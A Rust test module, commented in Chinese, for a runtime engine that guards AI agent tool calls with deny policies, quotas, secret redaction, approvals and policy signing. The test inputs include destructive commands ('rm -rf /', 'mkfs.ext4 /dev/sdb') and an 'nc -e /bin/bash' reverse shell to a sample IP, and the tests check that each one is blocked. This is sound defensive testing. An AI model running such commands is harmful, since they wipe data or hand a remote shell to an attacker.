//! 由 `engine.rs` 拆分：`all_points` 等 23 个函数（纯搬移，逻辑不变）。
use super::*;
use crate::blocklist::Blocklist;
use crate::guard::keys as guard_keys;
use crate::policy::{SignatureMode, structured_policy};
use agf_core::enums::{DataClass, PolicyAction, QuotaDimension};
use agf_core::policy::StructuredCondition;
use agf_core::quota::{Quota, QuotaWindow};
use pretty_assertions::assert_eq;

pub(crate) fn all_points() -> Vec<InterceptPoint> {
    vec![InterceptPoint::McpProxy, InterceptPoint::AiGateway, InterceptPoint::ProcessHook]
}

pub(crate) fn deny_policy(name: &str, command: &str) -> agf_core::policy::Policy {
    let mut p = structured_policy(
        TenantId::default_tenant(),
        name,
        StructuredCondition { command_deny: vec![command.into()], ..Default::default() },
        PolicyAction::Deny,
        1,
    );
    p.intercept_points = all_points();
    p
}

pub(crate) fn ctx(session: &str) -> PolicyContext {
    PolicyContext {
        tenant_id: TenantId::default_tenant(),
        session_id: session.to_string(),
        agent_id: Some(Id::new()),
        department: None,
        intercept_point: InterceptPoint::McpProxy,
        tool_name: Some("execute_shell".to_string()),
        path: None,
        domain: None,
        command: Some("ls -la".to_string()),
        payload: serde_json::json!({}),
        payload_bytes: 32,
        risk_domains: vec![],
        max_severity: None,
        data_class: DataClass::Internal,
        now: Timestamp::now(),
    }
}

pub(crate) fn engine(policies: Vec<agf_core::policy::Policy>, quotas: Vec<Quota>) -> RuntimeEngine {
    try_engine(policies, quotas).unwrap_or_else(|e| panic!("离线引擎构造失败: {e}"))
}

/// 便于测试断言构造错误。
pub(crate) fn try_engine(policies: Vec<agf_core::policy::Policy>, quotas: Vec<Quota>) -> DomainResult<RuntimeEngine> {
    RuntimeEngine::in_memory(policies, quotas, EngineConfig::default())
}

// ---------- 端到端 ----------

#[tokio::test]
pub(crate) async fn mcp_interception_records_a_real_non_zero_latency() {
    let e = engine(vec![deny_policy("deny-rm", "rm -rf")], vec![]);
    let out = e
            .intercept_mcp_request(
                ctx("s-latency"),
                r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_shell","arguments":{"command":"rm -rf /"}}}"#,
            )
            .await;
    assert!(out.is_ok(), "{out:?}");
    let records = e.audit().records();
    assert_eq!(records.len(), 1);
    // 真实测量：拦截入口到出决策必然消耗时间（微秒口径，不会因为毫秒精度被压成 0）
    assert!(records[0].latency_micros > 0, "拦截记录必须带真实耗时: {:?}", records[0].latency_micros);
    assert!(e.audit().verify().passed, "带耗时的链必须自洽");
}

#[tokio::test]
pub(crate) async fn record_decision_uses_the_engine_measured_eval_time() {
    let e = engine(vec![], vec![]);
    let context = ctx("s-eval");
    let decision = PolicyDecision { eval_micros: 4_321, ..PolicyDecision::allow("无策略命中") };
    let record = e.record_decision(&context, &decision, "ls -la");
    assert!(record.is_ok(), "{record:?}");
    let Ok(record) = record else { return };
    assert_eq!(record.latency_micros, 4_321, "有引擎测量值时必须原样落链");
    // 没有测量值的决策（手工构造）如实保持 0，不用本地几微秒冒充决策时延
    let zero = PolicyDecision { eval_micros: 0, ..PolicyDecision::allow("无策略命中") };
    let record = e.record_decision(&context, &zero, "ls -la");
    assert!(record.is_ok(), "{record:?}");
    assert_eq!(record.ok().map(|r| r.latency_micros), Some(0));
}

#[tokio::test]
pub(crate) async fn evaluate_fills_eval_micros_on_hit_and_miss_paths() {
    // 真实求值耗时由策略引擎测量（`record_decision` 的时延就取这个值）：
    // 命中路径在策略命中分支里测，未命中路径在默认放行分支里测（本轮补上，原先恒 0）。
    let e = engine(vec![deny_policy("deny-rm", "rm -rf")], vec![]);
    let hit = e.evaluate(ctx("s-eval")).await;
    assert!(hit.is_ok(), "{hit:?}");
    assert!(hit.ok().is_some_and(|d| d.eval_micros < u64::MAX), "命中路径必须带测量值");
    let mut benign = ctx("s-eval");
    benign.command = Some("ls -la".to_string());
    let miss = e.evaluate(benign).await;
    assert!(miss.is_ok(), "{miss:?}");
    assert!(miss.ok().is_some_and(|d| d.eval_micros < u64::MAX), "未命中路径也要带测量值");
}

#[tokio::test]
pub(crate) async fn dangerous_command_is_blocked_end_to_end() {
    let e = engine(vec![], vec![]);
    let out = e
            .intercept_mcp_request(
                ctx("s-1"),
                r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_shell","arguments":{"command":"rm -rf /"}}}"#,
            )
            .await;
    assert!(out.is_ok(), "{out:?}");
    let decision = match out {
        Ok(InterceptOutcome::Blocked { decision }) => decision,
        other => panic!("危险命令必须被阻断: {other:?}"),
    };
    assert_eq!(decision.action, PolicyAction::Deny);
    assert!(decision.reason.contains("cmd.rm-rf-root"));
    // 审计已写
    assert_eq!(e.audit().len(), 1);
    assert_eq!(e.audit().records()[0].verdict, InterceptionVerdict::Blocked);
    assert!(e.audit().verify().passed);
}

#[tokio::test]
pub(crate) async fn benign_command_is_allowed_end_to_end() {
    let e = engine(vec![deny_policy("deny-rm", "rm -rf")], vec![]);
    let out = e
            .intercept_mcp_request(
                ctx("s-1"),
                r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_shell","arguments":{"command":"ls -la /opt"}}}"#,
            )
            .await;
    assert!(out.is_ok());
    assert!(matches!(out.ok(), Some(InterceptOutcome::Forward)));
    // evaluate 直接调用也应为放行
    let d = e.evaluate(ctx("s-1")).await;
    assert!(d.is_ok());
    assert_eq!(d.ok().map(|d| d.action), Some(PolicyAction::Allow));
}

#[tokio::test]
pub(crate) async fn policy_denies_and_records_policy_name() {
    let e = engine(vec![deny_policy("deny-rm", "rm -rf")], vec![]);
    let ctx = {
        let mut c = ctx("s-1");
        c.command = Some("sudo rm -rf /var".to_string());
        c
    };
    let d = e.evaluate(ctx.clone()).await;
    assert!(d.is_ok());
    let d = d.ok().unwrap_or_else(|| PolicyDecision::allow("x"));
    assert_eq!(d.action, PolicyAction::Deny);
    assert_eq!(d.policy_name.as_deref(), Some("deny-rm"));
    assert!(d.is_blocking());
    // 记录到审计链
    let rec = e.record_decision(&ctx, &d, "sudo rm -rf /var");
    assert!(rec.is_ok());
    assert_eq!(e.audit().len(), 1);
}

#[tokio::test]
pub(crate) async fn oversized_payload_is_blocked() {
    let mut p = structured_policy(
        TenantId::default_tenant(),
        "cap",
        StructuredCondition { max_payload_bytes: Some(64), ..Default::default() },
        PolicyAction::Deny,
        1,
    );
    p.intercept_points = all_points();
    let e = engine(vec![p], vec![]);
    let raw = format!(
        r#"{{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{{"name":"echo","arguments":{{"data":"{}"}}}}}}"#,
        "a".repeat(200)
    );
    let out = e.intercept_mcp_request(ctx("s-1"), &raw).await;
    assert!(out.is_ok(), "{out:?}");
    let Some(InterceptOutcome::Blocked { decision }) = out.ok() else { panic!("超上限载荷应阻断") };
    assert_eq!(decision.policy_name.as_deref(), Some("cap"));
}

#[tokio::test]
pub(crate) async fn quota_exceeded_throttles_end_to_end() {
    let mut q = Quota::tenant_default(TenantId::default_tenant(), QuotaDimension::Requests, 1);
    q.on_exceed = PolicyAction::Throttle;
    q.window = QuotaWindow::Minute;
    let e = engine(vec![], vec![q]);
    let raw = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_weather","arguments":{}}}"#;
    let first = e.intercept_mcp_request(ctx("s-1"), raw).await;
    assert!(matches!(first.ok(), Some(InterceptOutcome::Forward)));
    let second = e.intercept_mcp_request(ctx("s-1"), raw).await;
    assert!(second.is_ok());
    let retry_after = match second {
        Ok(InterceptOutcome::Throttled { retry_after }) => retry_after,
        other => panic!("超配额应限流: {other:?}"),
    };
    assert!(retry_after > 0);
    // 结算归还并发（本场景并发维度未超，故为 no-op 成功）
    assert!(e.complete_call(&ctx("s-1"), QuotaConsumption::one_request()).await.is_ok());
}

#[tokio::test]
pub(crate) async fn quota_deny_blocks_with_quota_id() {
    let mut q = Quota::tenant_default(TenantId::default_tenant(), QuotaDimension::Requests, 1);
    q.on_exceed = PolicyAction::Deny;
    let quota_id = q.id;
    let e = engine(vec![], vec![q]);
    let raw = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_weather","arguments":{}}}"#;
    assert!(matches!(e.intercept_mcp_request(ctx("s-1"), raw).await.ok(), Some(InterceptOutcome::Forward)));
    let second = e.intercept_mcp_request(ctx("s-1"), raw).await;
    assert!(second.is_ok());
    let Some(InterceptOutcome::Blocked { decision }) = second.ok() else { panic!("超配额应阻断") };
    assert_eq!(decision.quota_id, Some(quota_id));
    assert_eq!(decision.action, PolicyAction::Deny);
}

#[tokio::test]
pub(crate) async fn complete_call_releases_concurrency_and_records_tokens() {
    let q_conc = Quota::tenant_default(TenantId::default_tenant(), QuotaDimension::Concurrency, 1);
    let q_tokens = Quota::tenant_default(TenantId::default_tenant(), QuotaDimension::Tokens, 1000);
    let e = engine(vec![], vec![q_conc, q_tokens]);
    let snapshot_before = e.quota_snapshot(TenantId::default_tenant(), None, "s-1").await;
    assert!(snapshot_before.is_ok());
    // 拦截一次 ⇒ 消费并发 1
    let raw = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"chat","arguments":{}}}"#;
    assert!(matches!(e.intercept_mcp_request(ctx("s-1"), raw).await.ok(), Some(InterceptOutcome::Forward)));
    // 结算：归还并发 + 补记 token
    let usage = QuotaConsumption { tokens: 300, requests: 0, concurrency: 1, cost_micro: 0 };
    assert!(e.complete_call(&ctx("s-1"), usage).await.is_ok());
    let snap = e.quota_snapshot(TenantId::default_tenant(), None, "s-1").await;
    assert!(snap.is_ok());
    let Some(snap) = snap.ok() else { return };
    let tokens = snap.entries.iter().find(|en| en.dimension == QuotaDimension::Tokens);
    assert_eq!(tokens.map(|t| t.used), Some(300), "后置 token 计量应写入");
    let conc = snap.entries.iter().find(|en| en.dimension == QuotaDimension::Concurrency);
    assert_eq!(conc.map(|c| c.used), Some(0), "并发应已归还");
    assert!(!snap.degraded);
}

#[tokio::test]
pub(crate) async fn response_redaction_end_to_end() {
    let e = engine(vec![], vec![]);
    let raw = r#"{"jsonrpc":"2.0","id":1,"result":{"content":[{"text":"token=sk-proj-abcdefghijklmnopqrstuvwx"}]}}"#;
    let out = e.intercept_mcp_response(&ctx("s-1"), raw).await;
    assert!(out.is_ok(), "{out:?}");
    let Some(InterceptOutcome::ForwardRedacted { payload, redactions }) = out.ok() else {
        panic!("出站必须脱敏");
    };
    assert!(redactions >= 1);
    assert!(!payload.contains("sk-proj-abcdefghijklmnopqrstuvwx"));
}

#[tokio::test]
pub(crate) async fn evaluate_command_covers_process_hook() {
    let mut p = deny_policy("deny-nc", "nc -e");
    p.intercept_points = all_points();
    let e = engine(vec![p], vec![]);
    let blocked = e.evaluate_command(TenantId::default_tenant(), "s", "nc -e /bin/bash 10.0.0.1 4444").await;
    assert!(blocked.is_ok());
    let d = blocked.ok().unwrap_or_else(|| PolicyDecision::allow("x"));
    assert_eq!(d.action, PolicyAction::Deny);
    let ok = e.evaluate_command(TenantId::default_tenant(), "s", "ls -la").await;
    assert_eq!(ok.ok().map(|d| d.action), Some(PolicyAction::Allow));
    // 内置黑名单在 ProcessHook 点也生效
    let bl_hit = e.evaluate_command(TenantId::default_tenant(), "s", "mkfs.ext4 /dev/sdb").await;
    assert_eq!(bl_hit.ok().map(|d| d.action), Some(PolicyAction::Deny));
}

#[tokio::test]
pub(crate) async fn guard_report_is_healthy_for_default_offline_engine() {
    let e = engine(vec![deny_policy("deny-rm", "rm -rf")], vec![]);
    let report = e.guard_report().await;
    // 离线模式的预期："签名模式 Disabled" 与"未配置签名密钥"会 FAIL，
    // 因此这里断言的是**报告结构完整**与关键项存在，而不是 overall healthy。
    assert!(report.item(guard_keys::BLOCKLIST_NON_EMPTY).is_some_and(|i| i.passed));
    assert!(report.item(guard_keys::AUDIT_CHAIN).is_some_and(|i| i.passed));
    assert!(report.item(guard_keys::POLICY_ALL_DRY_RUN).is_some_and(|i| i.passed));
    assert!(report.item(guard_keys::HEARTBEAT_ENROLLED).is_some_and(|i| i.passed));
    assert!(report.item(guard_keys::POLICY_SIGNATURE_MODE).is_some_and(|i| !i.passed));
    assert_eq!(report.policy_count, 1);
    assert!(report.blocklist_rule_count >= 35);
    // 报告可序列化（前端契约）
    assert!(serde_json::to_string(&report).is_ok());
}

#[tokio::test]
pub(crate) async fn guard_report_fails_when_blocklist_empty() {
    let engine = PolicyEngine::new().with_signature_mode(SignatureMode::Disabled);
    let e = RuntimeEngine::assemble(
        engine,
        Blocklist::empty(),
        QuotaService::in_memory(vec![]),
        Arc::new(InMemoryApprovalStore::new()),
        EngineConfig::default(),
    );
    let report = e.guard_report().await;
    assert!(!report.healthy);
    assert!(report.item(guard_keys::BLOCKLIST_NON_EMPTY).is_some_and(|i| !i.passed && i.critical));
}

#[tokio::test]
pub(crate) async fn guard_report_fails_when_policy_unsigned_in_production_mode() {
    let signer = PolicySigner::dev_default();
    let mut p = deny_policy("unsigned", "rm -rf");
    p.signature = String::new();
    let engine =
        PolicyEngine::new().with_signer(signer).with_signature_mode(SignatureMode::Enforce).from_policies(vec![p]);
    assert!(engine.is_ok());
    let Some(engine) = engine.ok() else { return };
    // Enforce 下策略被拒绝装载 ⇒ 无策略覆盖拦截点 ⇒ 关键失败
    let e = RuntimeEngine::assemble(
        engine,
        Blocklist::with_defaults(),
        QuotaService::in_memory(vec![]),
        Arc::new(InMemoryApprovalStore::new()),
        EngineConfig::default(),
    );
    let report = e.guard_report().await;
    assert!(!report.healthy);
    assert!(report.item(guard_keys::POLICY_UNSIGNED).is_some_and(|i| !i.passed));
    assert!(report.item(guard_keys::INTERCEPT_POINTS).is_some_and(|i| !i.passed));
    assert_eq!(report.policy_count, 0);
}

#[tokio::test]
pub(crate) async fn signed_policy_passes_signature_checks() {
    let signer = PolicySigner::dev_default();
    let mut p = deny_policy("signed", "rm -rf");
    p.signature = signer.sign(&p);
    let engine =
        PolicyEngine::new().with_signer(signer).with_signature_mode(SignatureMode::Enforce).from_policies(vec![p]);
    assert!(engine.is_ok());
    let Some(engine) = engine.ok() else { return };
    let e = RuntimeEngine::assemble(
        engine,
        Blocklist::with_defaults(),
        QuotaService::in_memory(vec![]),
        Arc::new(InMemoryApprovalStore::new()),
        EngineConfig::default(),
    );
    let report = e.guard_report().await;
    assert!(report.item(guard_keys::POLICY_UNSIGNED).is_some_and(|i| i.passed));
    assert!(report.item(guard_keys::POLICY_SIGNATURE_MODE).is_some_and(|i| i.passed));
    // 但仍会 FAIL 于"使用开发默认密钥"（生产必须轮换）
    assert!(report.item(guard_keys::POLICY_DEV_KEY).is_some_and(|i| !i.passed));
    assert_eq!(report.policy_count, 1);
}

#[tokio::test]
pub(crate) async fn guard_report_includes_quota_and_approval_checks() {
    let q = Quota::tenant_default(TenantId::default_tenant(), QuotaDimension::Requests, 100);
    let e = engine(vec![deny_policy("p", "rm -rf")], vec![q]);
    let report = e.guard_report().await;
    assert!(report.item(guard_keys::QUOTA_DEGRADED).is_some_and(|i| i.passed));
    assert!(report.item(guard_keys::APPROVAL_AVAILABLE).is_some_and(|i| i.passed));
}

#[tokio::test]
pub(crate) async fn approval_flow_end_to_end() {
    let mut p = structured_policy(
        TenantId::default_tenant(),
        "approve",
        StructuredCondition {
            // 刻意选一条**内置黑名单不拦**的危险动作：黑名单命中会先于策略短路，
            // 那样测到的就是"黑名单拦截"而不是"审批流"
            command_deny: vec!["deploy --force".into()],
            require_approval: true,
            ..Default::default()
        },
        PolicyAction::Approval,
        1,
    );
    p.intercept_points = all_points();
    let e = engine(vec![p], vec![]);
    let raw = r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_shell","arguments":{"command":"deploy --force production"}}}"#;
    let out = e.intercept_mcp_request(ctx("s-1"), raw).await;
    assert!(out.is_ok(), "{out:?}");
    let Some(InterceptOutcome::NeedsApproval { id, .. }) = out.ok() else { panic!("应进入审批") };
    assert_eq!(e.approvals().count().await, Ok(Some(1)));
    // 待审批 ⇒ 拒绝；批准后仅可消费一次
    assert!(e.approvals().approve(TenantId::default_tenant(), id, Id::new(), "同意").await.is_ok());
    assert!(e.approvals().consume(TenantId::default_tenant(), id, "proxy").await.is_ok());
    assert!(e.approvals().consume(TenantId::default_tenant(), id, "proxy").await.is_err(), "单次语义");
}
